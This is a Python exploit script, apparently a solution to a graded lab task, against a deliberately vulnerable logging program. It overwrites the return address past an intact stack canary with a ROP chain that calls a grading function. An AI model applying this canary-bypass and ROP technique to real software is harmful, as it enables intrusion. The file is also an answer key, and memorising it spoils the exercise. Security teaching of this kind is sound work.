#!/usr/bin/env python3
"""Task 7 payload: defeat attack/dark-log's stack canary without leaking it.

struct log_frame (src/dark-log.c) is laid out in the frame as:

    rbp-0x120  char expression[128]
    rbp-0x0a0  char logMsg[128]
    rbp-0x020  int  len
    rbp-0x018  char pad[8]
    rbp-0x008  stack canary (copied from fs:0x28)
    rbp+0x000  saved rbp
    rbp+0x008  saved return address

input() calls gets(f.expression), then performs

    memcpy(f.logMsg + f.len, f.expression, sizeof(f.expression));

so the attacker-controlled `len` selects the destination of a fixed 128-byte
copy.  Setting len = 0xa0 makes the destination rbp+0, i.e. the copy overwrites
the saved rbp and the saved return address while leaving the canary at rbp-0x8
untouched.  The canary check therefore passes, `leave; ret` returns into the
chain below, and no canary value ever has to be known.

The payload is exactly 260 bytes: offsets 0..255 carry the fake frame and the
ROP chain, offsets 256..259 are the little-endian len (a0 00 00 00), and the
NUL that gets() appends lands at offset 260 -- 20 bytes short of the canary.
Bytes 0..127 are the source of the memcpy, so the fake frame lives there:

    expression[0..7]    filler for the saved rbp
    expression[8..15]   0x4018a3  pop rdi; ret
    expression[16..23]  4
    expression[24..31]  0x401677  grade_eval

The 0x4018a3 gadget is the unaligned second byte of __libc_csu_init's
"pop r15; ret" epilogue (41 5f c3 -> 5f c3).
"""
import struct
import sys

POP_RDI = 0x4018A3
GRADE_EVAL = 0x401677
OVERWRITE_DEST = 0xA0       # logMsg + 0xa0 == rbp

chain = b"K" * 8
chain += struct.pack("<Q", POP_RDI)
chain += struct.pack("<Q", 4)
chain += struct.pack("<Q", GRADE_EVAL)

payload = chain.ljust(256, b"L")
payload += struct.pack("<I", OVERWRITE_DEST)
payload += b"\n"

assert len(payload) == 261
assert b"\n" not in payload[:-1]
sys.stdout.buffer.write(payload)
